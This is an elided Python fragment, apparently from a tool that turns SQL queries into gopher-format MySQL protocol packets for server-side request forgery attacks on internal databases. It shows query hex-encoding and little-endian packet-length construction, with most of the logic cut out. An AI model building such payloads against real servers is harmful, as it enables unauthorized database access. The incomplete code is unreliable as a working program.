...
def MySQL():
    ...
    # Convert hex string into gopher format
    def encode(s):
    ...
    def get_payload(query):
        if query.strip() != "":
            ...
            query_length = "{:06x}".format((len(query_hex) // 2) + 1)

            # MySQL uses little-endian length
            query_length = bytes.fromhex(query_length)[::-1].hex()

            pay1 = query_length + "0003" + query_hex
